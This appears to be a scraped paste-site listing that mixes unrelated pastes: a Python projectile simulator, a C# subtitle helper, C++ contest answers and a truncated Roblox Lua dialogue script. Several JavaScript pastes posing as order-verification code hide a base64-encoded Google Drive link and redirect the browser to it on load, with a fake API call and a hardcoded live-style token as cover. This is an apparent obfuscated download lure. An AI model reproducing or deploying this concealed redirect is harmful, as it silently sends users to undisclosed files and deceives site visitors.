    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3yD4LyGz,Stanislav Comendant NEA source code,nozeros,Python,Wednesday 2nd of April 2025 02:20:35 PM CDT,"## Libraries ## 
import customtkinter
from PIL import Image
import webview
import plotly.graph_objects as go
import sys

import math
import numpy as np

## Functions ##
def main():
    def checkbox():    # Creates the mass and diameter input boxes if the checkbox is checked, otherwise it destroys them
                        
        if dragcheck.get():

            # Labels and input boxes for mass and diameter
            global masstext, massinp, massinfo
            masstext=customtkinter.CTkLabel(inputframe, fg_color=""transparent"", text=""Enter mass:"", text_color=labelcolour)
            masstext.place(x=83, y=640)
            massinp=customtkinter.CTkEntry(master=inputframe, placeholder_text=""n/a"")
            massinp.pack(pady=50, padx=0)

            massinfo=customtkinter.CTkButton(inputframe, text=""?"",width=15,height=15, border_width=1, border_color=""gray"",command=lambda: info(""Changes the mass of the projectile.\nTakes float values above 0 in kilograms (metric) or pounds (imperial).\nA projectile's mass affects its motion by reducing the \ndecelerating impact of air resistance.""))
            massinfo.place(y=640,x=265)

            global diametertext, diameterinp,diameterinfo
            diametertext=customtkinter.CTkLabel(inputframe, fg_color=""transparent"",text=""Enter diameter:"", text_color=labelcolour)
            diametertext.place(x=83, y=768)
            diameterinp=customtkinter.CTkEntry(master=inputframe, placeholder_text=""n/a"")
            diameterinp.pack(pady=50, padx=0)

            diameterinfo=customtkinter.CTkButton(inputframe, text=""?"",width=15,height=15, border_width=1, border_color=""gray"",command=lambda: info(""Changes the diameter of the sphere.\nTakes float values above 0 in metres (metric) or feet (imperial).\nA higher diameter means a higher cross-sectional area, \nleading to a higher drag force and more deceleration. ""))
            diameterinfo.place(y=768,x=265)

            global dragcoeftext, dragcoefinp, dragcoefinfo
            dragcoeftext=customtkinter.CTkLabel(inputframe, fg_color=""transparent"",text=""Enter drag coefficient:"", text_color=labelcolour)
            dragcoeftext.place(x=83, y=896)
            dragcoefinp=customtkinter.CTkEntry(master=inputframe, placeholder_text=""Default: 0.47"")
            dragcoefinp.pack(pady=50, padx=0)

            dragcoefinfo=customtkinter.CTkButton(inputframe, text=""?"",width=15,height=15, border_width=1, border_color=""gray"",command=lambda: info(""Changes the drag coefficient of the projectile.\nTakes float values above 0.\nA higher drag coefficient means a higher drag force and more deceleration.\n\nSome common drag coefficients are: (none are hollow)\nSphere: 0.47\n""
            ""Cube (face facing forward): 1.05\n Cube (corner facing forward): 0.8\nSemisphere (concave side): 0.42\nSemisphere (convex side): 1.17\nTetrahedron (pointy side): 0.50\nPlate: 1.17""))
            dragcoefinfo.place(y=896,x=265)

        else:
            if 'masstext' in globals():   # Destroys the mass and diameter input boxes if the checkbox is unchecked, and if they exist
                masstext.destroy()
                massinp.destroy()
                massinfo.destroy()

            if 'diametertext' in globals():
                diametertext.destroy()
                diameterinp.destroy()
                diameterinfo.destroy()

            if 'dragcoeftext' in globals():
                dragcoeftext.destroy()
                dragcoefinp.destroy()
                dragcoefinfo.destroy()
            
    def info(message):      # Creates an info window with a message
        
        global infowindow     # If an info window is already opened, the old one gets destroyed and a new one is created
        try:
            if 'normal' == infowindow.state():
                infowindow.destroy()
        except:
                pass
        
        # Info window with its contents
        infowindow=customtkinter.CTk(fg_color=backgroundcolour)
        infowindow.geometry(""500x300"")
        infowindow.resizable(False,False)
        infowindow.title(""?? Info ??"")

        text=customtkinter.CTkLabel(infowindow,text=message,fg_color=""transparent"",text_color=labelcolour)
        text.pack(pady=50,padx=10)

        mainwindow.protocol(""WM_DELETE_WINDOW"", lambda: close(infowindow))  # Closes the info window and the main window when the 'X' button on the main window is pressed

        infowindow.mainloop()
    


    global mainwindow,inputframe,dragcheck,angleinp,velocityinp,gravityinp,ystartinp,dragcoefinp

    customtkinter.set_appearance_mode(theme)
    customtkinter.set_default_color_theme(accentcolour)
    customtkinter.deactivate_automatic_dpi_awareness()

    # Main menu window
    mainwindow = customtkinter.CTk(fg_color=backgroundcolour)
    mainwindow.title(""Projectile motion simulator"")
    mainwindow.geometry(""345x1200"")
    mainwindow.resizable(False, False) 

    # Main frame in the main menu
    inputframe = customtkinter.CTkFrame(mainwindow,fg_color=framecolour)      
    inputframe.pack(pady=(90, 20), padx=(20, 20), fill=""both"", expand=True,)

    # Buttons
    runbutton = customtkinter.CTkButton(mainwindow, text=""Run"", width=120, height=40, border_width=1, border_color=""gray"", command=runsim)      
    runbutton.place(x=41, y=21)

    settingpng = customtkinter.CTkImage(light_image=Image.open(""settings.png""))                                                               
    settingbutton = customtkinter.CTkButton(mainwindow, text="""", image=settingpng, width=40, height=40, border_width=1, border_color=""gray"", command=settings)
    settingbutton.place(x=255, y=21)

    # Labels and input boxes for each variable (airdrag, angle, velocity, gravity)
    dragcheck = customtkinter.CTkCheckBox(inputframe, text=""Air resistance"", command=checkbox,text_color=labelcolour)
    dragcheck.pack(pady=50)

    angletext = customtkinter.CTkLabel(inputframe, fg_color=""transparent"", text=""Enter angle:"", text_color=labelcolour)
    angletext.place(x=83, y=128)
    angleinp = customtkinter.CTkEntry(inputframe, placeholder_text=""n/a"")
    angleinp.pack(pady=50, padx=0)

    angleinfo = customtkinter.CTkButton(inputframe, text=""?"", width=15, height=15, border_width=1, border_color=""gray"", command=lambda: info(""Changes the angle with the ground at which the projectile is launched.\nTakes float values between 0-90 degrees, inclusive""))
    angleinfo.place(y=136, x=265)

    velocitytext = customtkinter.CTkLabel(inputframe, fg_color=""transparent"", text=""Enter initial velocity:"", text_color=labelcolour)
    velocitytext.place(x=83, y=256) 
    velocityinp = customtkinter.CTkEntry(inputframe, placeholder_text=""n/a"")
    velocityinp.pack(pady=50, padx=0)

    velocityinfo = customtkinter.CTkButton(inputframe, text=""?"", width=15, height=15, border_width=1, border_color=""gray"", command=lambda: info(""Changes the velocity at which the projectile is shot.\nTakes float values above 0 in metres per second (metric) or \nfeet per second (imperial).""))
    velocityinfo.place(y=262, x=265)

    gravitytext = customtkinter.CTkLabel(inputframe, fg_color=""transparent"", text=""Enter gravity:"" ,text_color=labelcolour)
    gravitytext.place(x=83, y=384)
    if units==""Metric"":
        gravityinp = customtkinter.CTkEntry(master=inputframe, placeholder_text=""Default: 9.81 m/s^2"")
    else:
        gravityinp = customtkinter.CTkEntry(master=inputframe, placeholder_text=""Default: 32.19 ft/s^2"")
    gravityinp.pack(pady=50, padx=0)

    gravityinfo = customtkinter.CTkButton(inputframe, text=""?"", width=15, height=15, border_width=1, border_color=""gray"", command=lambda: info(""Changes the acceleration of the projectile to the ground due to gravity.\nTakes float values above 0 in metres per second squared (metric) \nor feet per second squared (imperial).""))
    gravityinfo.place(y=388, x=265)

    ystarttext= customtkinter.CTkLabel(inputframe, fg_color=""transparent"", text=""Enter starting height:"", text_color=labelcolour)
    ystarttext.place(x=83, y=512)
    if units==""Metric"":
        ystartinp = customtkinter.CTkEntry(inputframe, placeholder_text=""Default: 0 m"")
    else:
        ystartinp = customtkinter.CTkEntry(inputframe, placeholder_text=""Default: 0 ft"")
    ystartinp.pack(pady=50, padx=0)

    ystartinfo=customtkinter.CTkButton(inputframe, text=""?"", width=15, height=15, border_width=1, border_color=""gray"", command=lambda: info(""Changes the height at which the projectile starts.\nTakes float values above 0 in metres (metric) or feet (imperial).""))
    ystartinfo.place(y=514, x=265)
    
    tooltip = customtkinter.CTkButton(mainwindow, text=""?"", width=28, height=28, border_width=1, border_color=""gray"", command=lambda: info(""Some helpful keybinds for quicker acess:\n\nPress 'Enter','Space' or 'R' to run the simulation.\nPress 'S' to open settings.\nPress 'Esc' to exit the program.""))
    tooltip.place(y=21, x=300)


    # Keybinds
    mainwindow.bind(""<Return>"", runsim)  # Return=Enter
    mainwindow.bind(""<space>"", runsim)
    mainwindow.bind(""<r>"", runsim)
    mainwindow.bind(""<s>"", settings)
    mainwindow.bind(""<Escape>"", lambda e: sys.exit()) # Escape closes the window


    mainwindow.mainloop()

def runsim(event=None):
    def warning(message):       # Creates a warning window with a message
        
        global warningwindow     # If a warning window is already opened, the old one gets destroyed and a new one is created
        try:
            if 'normal' == warningwindow.state():
                warningwindow.destroy()
        except:
                pass

        # Warning window with its contents
        warningwindow=customtkinter.CTk()
        warningwindow.geometry(""500x300"")
        warningwindow.resizable(False,False)
        warningwindow.title(""!! Warning !!"")

        warningtext=customtkinter.CTkLabel(warningwindow, fg_color=""transparent"", text=message)
        warningtext.pack(pady=100,padx=10)

        mainwindow.protocol(""WM_DELETE_WINDOW"", lambda: close(warningwindow))  # Closes the warning window and the main window when the 'X' button on the main window is pressed

        warningwindow.mainloop()
        

    
    try:
        #  Takes from input boxes in UI
        dragbool = dragcheck.get()
        angle = float(angleinp.get())
        velocity = float(velocityinp.get().strip()) ############################################

        # Gets the gravity and starting height, defaulting to 0 m and 9.81 m respectively if empty
        if not gravityinp.get():
            gravity=9.81
        else:
            gravity=float(gravityinp.get())

        if not ystartinp.get():      
            height=0
        else:
            height= float(ystartinp.get())


        # Valulues are converted to metric if the user has selected imperial units
        if units == ""Imperial"":
            velocity = velocity / 3.28084
            gravity = gravity / 3.28084
            height= height / 3.28084

        if 0 < angle <= 90 and velocity > 0 and gravity > 0 and height >= 0:    # Input validation
            if dragbool == True:
                mass = float(massinp.get())
                diameter = float(diameterinp.get())
                if not dragcoefinp.get():
                    dragcoef = 0.47
                else:
                    dragcoef = float(dragcoefinp.get())
                
                if mass > 0 and diameter > 0 and dragcoef > 0:
                    if units == ""Imperial"":
                        mass = mass / 2.20462
                        diameter = diameter / 3.28084

                    xpoints, ypoints, x_at_ymax, ymax, frames, frametime = airres(angle, velocity, gravity, mass, diameter, height, dragcoef)
                    graph(xpoints, ypoints, x_at_ymax, ymax, frames, frametime)
                else:
                    warning(""Mass, diameter and drag coefficient values are required for air resistance.\nThey must all be above 0."")

            elif dragbool == False:
                xpoints, ypoints, x_at_ymax, ymax, frames, frametime = noairres(angle, velocity, gravity, height)
                graph(xpoints, ypoints, x_at_ymax, ymax, frames, frametime)
        else:
            warning(""Angle, velocity, gravity and height values are required.\nAngle must be between 0 and 90 degrees.\nVelocity, gravity and starting height must be above 0."")
    except ValueError or TypeError:
        warning(""Do not leave values blank.\nMake sure all values are numbers."")

def noairres(theta,u,g,h):
    t=0
    y=0
    xpoints=[]
    ypoints=[]
    frames=[]
    theta=math.radians(theta) # Degrees to radians

    #Simplified SUVAT equations are used
    x_at_ymax=u*math.cos(theta)*(u*math.sin(theta))/g   # Calculates the x coordinate of the maximum height
    ymax= x_at_ymax*math.tan(theta)-g*(x_at_ymax**2)*(1+math.tan(theta)**2)/(2*u**2)+h # y coordinate of the maximum height


    tmax= (u*math.sin(theta)+math.sqrt((u*math.sin(theta))**2+2*g*h))/g  # Calculates the maximum time of flight
    step=tmax/1000    # Keeps the step small enough, but also not too small

    while y>=0:
        # SUVAT equations
        x= u*math.cos(theta)*t  
        y= u*math.sin(theta)*t-0.5*g*t**2 + h  # Translates upwards based on the starting height

        xpoints.append(x)
        ypoints.append(y)
        frames.append(go.Frame(data=[go.Scatter(x=xpoints, y=ypoints, mode='lines')]))

        t+=step

    
    # All steps have been completed, the current time is the maximum time
    tmax = t
    frameduration = (tmax * 1000) / len(frames)  # The duration of each frame in milliseconds
    
    # Converts the values back to imperial if the user has selected imperial units
    if units==""Imperial"":
        xpoints = [x * 3.28084 for x in xpoints]
        ypoints = [y * 3.28084 for y in ypoints]

    return xpoints,ypoints,x_at_ymax,ymax,frames,frameduration

def airres(theta,u,g,m,d,h,cd): 
    def calculating_Accel(t, state, m):
        x, y, vx, vy = state  # Unnpacks the state list
        v = np.sqrt(vx**2 + vy**2)  # Pythagoream theorem
        
        k = 0.5*cd*1.225*math.pi*(d/2)**2  # Drag coefficient

        xF_air = -k * v * vx
        yF_air = -k * v * vy
        ax = xF_air / m
        ay = (yF_air - m * g) / m
        
        return [vx, vy, ax, ay]
    
    
    theta = np.radians(theta)
    vx0 = u * np.cos(theta)
    vy0 = u * np.sin(theta)

    # Estimates the maximum time, as there is no analytical solution
    tmax_estimate = (u*math.sin(theta)+math.sqrt((u*math.sin(theta))**2+2*g*h))/g 
    step = tmax_estimate / 1000     # Keeps the step small enough, but also not too small
    
    state = np.array([0 , h , vx0 , vy0])  # Initial state of the projectile (x, y, vx, vy)
    t = 0
    ymax = 0
    frames = []
    xpoints = [0]
    ypoints = [h]  # The starting height is set as the first point
    
    while state[1] >= 0:
        # Runge-Kutta 4th order method to find the projectile's path
        k1 = np.array(calculating_Accel(t, state,m)) * step
        k2 = np.array(calculating_Accel(t + step / 2, state + k1 / 2,m)) * step
        k3 = np.array(calculating_Accel(t + step / 2, state + k2 / 2,m)) * step
        k4 = np.array(calculating_Accel(t + step, state + k3,m)) * step 

        state=state + 1 / 6 * (k1+2*k2+2*k3+k4)
        
        xpoints.append(state[0])  # Appends the x and y coordinates to the list
        ypoints.append(state[1])   
        frames.append(go.Frame(data=[go.Scatter(x=xpoints, y=ypoints, mode='lines')]))

        # state[1] is the y coordinate of the projectile, it calculates the coordinates at the maximum
        if state[1] >= ymax:
            ymax=state[1]
            x_at_ymax=state[0]
        
        t += step

    # All steps have been completed, the current time is the maximum time
    tmax = t
    frameduration = (tmax * 1000) / len(frames)  # The duration of each frame in milliseconds

    return xpoints,ypoints,x_at_ymax,ymax, frames, frameduration

def graph(xpoints,ypoints,x_at_ymax,ymax,frames,frametime):

    # Checks the current settings set by the user to determine the labels
    if units == ""Imperial"":
        x_label = ""Horizontal Displacement (ft)""
        y_label = ""Vertical Displacement (ft)""
    else:
        x_label = ""Horizontal Displacement (m)""
        y_label = ""Vertical Displacement (m)""

    # Creates the graph and animates it
    line = go.Figure(
        data=[go.Scatter(x=[xpoints[0]], y=[ypoints[0]], mode='lines', name='Projectile', line=dict(color='blue'))],
        layout=go.Layout(
            title=""Projectile Motion Animation"",
            xaxis=dict(title=x_label,zeroline=True, zerolinewidth=2, zerolinecolor='lightblue'),  # Colours the axes to make them more visible
            yaxis=dict(title=y_label,zeroline=True, zerolinewidth=2, zerolinecolor='lightblue'),
            updatemenus=[
                dict(
                    type=""buttons"",
                    showactive=True,
                    buttons=[
                        dict(label=""Play"", method=""animate"", args=[None, {""frame"": {""duration"": frametime, ""redraw"": True}, ""fromcurrent"": False}]),   # Play and pause buttons
                        dict(label=""Pause"", method=""animate"", args=[[None], {""mode"": ""immediate""}]),],)],),
        frames=frames)

    #Creates maximum point marker
    line.add_trace(go.Scatter(x=[x_at_ymax],y=[ymax], mode='markers+text', name='Maximum Point', text=f'Max: ({x_at_ymax:.2f},{ymax:.2f})',textposition='top center', marker=dict(color='blue',size=10,symbol='circle')))
    
    # Creates the graph in a HTML file
    filename = ""plot.html""
    line.write_html(filename)
    
    # Opens the html file in a webview window
    webview.create_window(""Interactive Graph"", filename, width=1920, height=1080, hidden=False)
    webview.start()

def settings(event=None):  
    def changetheme(selected):    
        global theme
        theme=selected.lower()

        mainwindow.destroy()
        settingwindow.destroy()
        main()

    def changebuttons(selected):
        global accentcolour
        if selected==""Blue"":
            accentcolour=""blue""
        elif selected==""Dark blue"":
            accentcolour=""dark-blue""
        else:
            accentcolour=""green""

        mainwindow.destroy()
        settingwindow.destroy()
        main()
        
    def changeunits(selected):
        global units
        units=selected

        mainwindow.destroy()
        settingwindow.destroy()
        main()

    def changecolour(location, selected):
        global backgroundcolour,framecolour,labelcolour
        if location==""background"":
            if selected==""Default"":
                backgroundcolour=['gray92', 'gray14']   # Default customtkinter colour
            else:
                backgroundcolour=selected

        elif location==""frame"":
            if selected==""Default"":
                framecolour=['gray86', 'gray17']
            else:
                framecolour=selected

        elif location==""label"":
            if selected==""Default"":
                labelcolour=['gray10', '#DCE4EE']
            else:
                labelcolour=selected

        mainwindow.destroy()
        settingwindow.destroy()
        main()

    global settingwindow       # Checks if the settings window is already open, and prevents it from opening again if it is
    try:
        if 'normal' == settingwindow.state():
            return
    except:
            pass
    
    # The settings window
    settingwindow=customtkinter.CTk(fg_color=backgroundcolour)
    settingwindow.geometry(""300x700"")
    settingwindow.resizable(False,False)
    settingwindow.title(""Settings"")

    # The settings frame
    settingsframe=customtkinter.CTkFrame(settingwindow,fg_color=framecolour)
    settingsframe.pack(pady=(20,20),padx=(20,20),fill=""both"",expand=True)
    
    # Creates the labels and option menu for each setting (theme, units, background color, frame colour, button colour, text colour)
    themetext=customtkinter.CTkLabel(settingsframe, fg_color=""transparent"", text=""Change theme:"",text_color=labelcolour)
    themetext.place(x=62,y=20)
    themepick=customtkinter.CTkOptionMenu(settingsframe, values=[""Dark"",""Light""], command=lambda selected: changetheme(selected))
    themepick.set(theme.capitalize())
    themepick.pack(pady=(50,20))

    unittext=customtkinter.CTkLabel(settingsframe, fg_color=""transparent"", text= ""Change units:"",text_color=labelcolour)
    unittext.place(x=62,y=90)
    unitpick=customtkinter.CTkOptionMenu(settingsframe, values=[""Metric"", ""Imperial""],command=lambda selected: changeunits(selected) )
    unitpick.set(units)
    unitpick.pack(pady=20)

    backgroundtext=customtkinter.CTkLabel(settingsframe, fg_color=""transparent"", text=""Change background colour:"",text_color=labelcolour)  # Background colour
    backgroundtext.place(x=62,y=158)
    backgroundpick=customtkinter.CTkOptionMenu(settingsframe, values=[""Default"",""Black"",""White"",""Snow"",""Light Slate Gray"",""Medium Sea Green"",""Light Goldenrod"",""Light Sky Blue"",""Indian Red"",""Hot Pink"",""Medium Purple""],command=lambda selected: changecolour(""background"",selected))
    if backgroundcolour==['gray92', 'gray14']: # Default customtkinter colour
        backgroundpick.set(""Default"")
    else:
        backgroundpick.set(backgroundcolour)
    backgroundpick.pack(pady=20)

    frametext=customtkinter.CTkLabel(settingsframe, fg_color=""transparent"", text=""Change frame colour:"",text_color=labelcolour)  # Frame colour
    frametext.place(x=62,y=226)
    framepick=customtkinter.CTkOptionMenu(settingsframe, values=[""Default"",""Black"",""White"",""Snow"",""Light Slate Gray"",""Medium Sea Green"",""Light Goldenrod"",""Light Sky Blue"",""Indian Red"",""Hot Pink"",""Medium Purple""],command=lambda selected: changecolour(""frame"",selected))
    if framecolour==['gray86', 'gray17']:
        framepick.set(""Default"")
    else:
        framepick.set(framecolour)
    framepick.pack(pady=20)

    global accentcolour
    buttontext=customtkinter.CTkLabel(settingsframe, fg_color=""transparent"",text=""Change buttons colour:"",text_color=labelcolour)  # Button colour
    buttontext.place(x=62,y=294)
    buttonpick=customtkinter.CTkOptionMenu(settingsframe, values=[""Blue"", ""Dark blue"", ""Green""],command=lambda selected: changebuttons(selected))
    buttonpick.set(accentcolour.capitalize())
    buttonpick.pack(pady=20)

    labeltext=customtkinter.CTkLabel(settingsframe, fg_color=""transparent"", text=""Change text colour:"",text_color=labelcolour)      #Text colour
    labeltext.place(x=62,y=362)
    labelpick=customtkinter.CTkOptionMenu(settingsframe, values=[""Default"",""Black"",""White""],command=lambda selected: changecolour(""label"",selected))
    if labelcolour==['gray10', '#DCE4EE']:
        labelpick.set(""Default"")
    else:
        labelpick.set(labelcolour)
    labelpick.pack(pady=20)


    mainwindow.protocol(""WM_DELETE_WINDOW"", lambda: close(settingwindow))  # Closes the settings window and the main window when the 'X' button on the main window is pressed


    # Keybinds
    settingwindow.bind(""<Escape>"", lambda e: sys.exit())  # 'Escape' closes the window

    settingwindow.mainloop()

def close(window):
    try:
        window.destroy()
        mainwindow.destroy()
    except:
        mainwindow.destroy()




## Main code ##

# Sets default settings at startup
backgroundcolour=['gray92', 'gray14']
framecolour=['gray86', 'gray17']
labelcolour=['gray10', '#DCE4EE']
theme=""system""
accentcolour=""blue""
units=""Metric""


main()"
EwN0evL0,Products.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 02:20:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/706/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X1T5yQ2N,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 02:04:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/836/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FFDesvyg,SubtitleEdit: Merge subtitles,ivandrofly,C#,Wednesday 2nd of April 2025 02:02:43 PM CDT,"namespace Nikse.SubtitleEdit.Extensions
{
    public static class SubtitleExtensions
    {
        public static void Merge(this Subtitle subtitle, IEnumerable<Paragraph> paragraphs)
        {
            var mergingParagraphs = paragraphs.OrderBy(p => p.Number).ToArray();
            if (mergingParagraphs.Length < 2)
            {
                return;
            }

            // check if sequential
            if (!IsSequential(paragraphs))
            {
                return;
            }

            // Array.Sort(paragraphs, (p, other) => p.Number.CompareTo(other.Number));
            var pivotParagraph = mergingParagraphs.First();
            pivotParagraph.EndTime = mergingParagraphs.Last().EndTime;
            pivotParagraph.Text = Utilities.AutoBreakLine(string.Join(Environment.NewLine, mergingParagraphs.Select(p => p.Text)));

            // note: this required that the paragraph number is sequential and starting from 1
            subtitle.Paragraphs.RemoveRange(pivotParagraph.Number - 1, mergingParagraphs.Skip(1).Count());

            bool IsSequential(IEnumerable<Paragraph> sequentialParagraphs)
            {
                int sequenceStart = sequentialParagraphs.First().Number;
                var range = Enumerable.Range(sequenceStart, sequentialParagraphs.Count());
                var indexedParagraph = sequentialParagraphs.Zip(range, (p, i) => new ValueTuple<int, Paragraph>(i, p));
                return sequentialParagraphs.Skip(1).All(p => p.Number == sequenceStart + 1);
            }
        }
    }
}"
YWaGDrhp,穿越时空之门 参考代码,Dmaxiya,C++,Wednesday 2nd of April 2025 02:01:47 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int ans;

int cal(int x, int p) {
    int ret = 0;
    while (x != 0) {
        ret += x % p;
        x /= p;
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int i = 1; i <= 2024; ++i) {
        if (cal(i, 2) == cal(i, 4)) {
            ++ans;
        }
    }
    cout << ans << endl;

    return 0;
}
"
NhsNQXV3,报数游戏 参考代码,Dmaxiya,C++,Wednesday 2nd of April 2025 01:54:06 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 50;

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

//    int cnt = 0;
//    for (int i = 1; i < 100; ++i) {
//        if (i % 20 == 0 || i % 24 == 0) {
//            cout << (++cnt) << "": "" << i << endl;
//        }
//    }
    cout << 202420242024LL / 10 * 120 + 48 << endl;

    return 0;
}
"
k1SLqMBt,Market.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 01:49:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/266/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qA7UyQfD,劲舞团 参考代码,Dmaxiya,C++,Wednesday 2nd of April 2025 01:43:09 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 1000000 + 100;
char a, b;
int ans, tmp;
LL t, lastT;

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    while (cin >> a >> b >> t) {
        if (a != b) {
            lastT = 0;
            tmp = 0;
            continue;
        }
        if (t - lastT <= 1000) {
            ++tmp;
        } else {
            tmp = 1;
        }
        lastT = t;
        ans = max(ans, tmp);
    }
    cout << ans << endl;
//    cout << 9 << endl;

    return 0;
}
"
D2izww3m,DialogueManager,Ettaby,Lua,Wednesday 2nd of April 2025 01:35:52 PM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")

local Player = Players.LocalPlayer

local Assets = ReplicatedStorage:WaitForChild(""Assets"")
local UIAssets = Assets:WaitForChild(""UI"")

local Shared = ReplicatedStorage:WaitForChild(""Shared"")
local Modules = Shared:WaitForChild(""Modules"")
local Data = Shared:WaitForChild(""Data"")
local Remotes = Shared:WaitForChild(""Remotes"")

local CharacterReplica = require(Modules.CharacterReplica)
local LibraryLoader = require(Modules.LibraryLoader)

local InterfaceUtils = LibraryLoader:Load(ReplicatedStorage.Shared.Libraries.Utilities.InterfaceUtils)
local TweenUtils = LibraryLoader:Load(ReplicatedStorage.Shared.Libraries.Utilities.TweenUtils)

local DialogUI = UIAssets:WaitForChild(""DialogUI"")
local DialogueData = require(Data:WaitForChild(""Dialogues""))
local CharacterDataEvent = Remotes:WaitForChild(""CharacterDataUpdated"")
local StartEvent = Remotes:WaitForChild(""StartDialogue"")

local ContinuationConnection: RBXScriptConnection = nil
local ReplyConnections: {RBXScriptConnection} = {}

local TweenInformation = TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

local CONTAINER_ENTER_POSITION = UDim2.new(0.499, 0, 0.953, 0)
local CONTAINER_LEAVE_POSITION = UDim2.new(0.499, 0, 1, 0)

local REPLY_SHOW_SIZE = UDim2.new(0.99, 0, 0.33, 0)
local REPLY_HIDE_SIZE = UDim2.new(0.99, 0, 0, 0)

local HideReplies
local ShowReplies
local Advance
local Exit
local Enter

local function SetDialogue(UserInterface: ScreenGui, DialogueTable)
	local UI = UserInterface
	local Container = UI:WaitForChild(""Container"")
	local Dialogue = Container:WaitForChild(""Dialogue"")

	Dialogue.SpeakerFrame.Speaker.Text = DialogueTable.Speaker
	InterfaceUtils.Typewrite(Dialogue.Content, DialogueTable.DialogueContent, DialogueTable.TypingSpeed / 100)
end

Advance = function(UserInterface, DialogueTable)
	local Container = UserInterface:WaitForChild(""Container"")
	local DialogueFrame = Container:WaitForChild(""Dialogue"")

	if DialogueTable.Function then
		DialogueTable.Function(Player)
	end

	HideReplies(UserInterface)
	SetDialogue(UserInterface, DialogueTable)

	if ContinuationConnection then
		ContinuationConnection:Disconnect()
		ContinuationConnection = nil
	end

	if not DialogueTable.Next or not next(DialogueTable.Next) then
		ContinuationConnection = DialogueFrame.Button.MouseButton1Click:Connect(function()
			Exit(UserInterface)
		end)
	elseif DialogueTable.Replies and next(DialogueTable.Replies) then
		ShowReplies(UserInterface, DialogueTable)
	else
		ContinuationConnection = DialogueFrame.Button.MouseButton1Click:Connect(function()
			Advance(UserInterface, DialogueTable.Next[1])
		end)
	end
end

HideReplies = function(UserInterface: ScreenGui)
	local UI = UserInterface
	local Container = UI:WaitForChild(""Container"")
	local Replies = Container:WaitForChild(""Replies"")

	for _, Connection in ReplyConnections do Connection:Disconnect() end

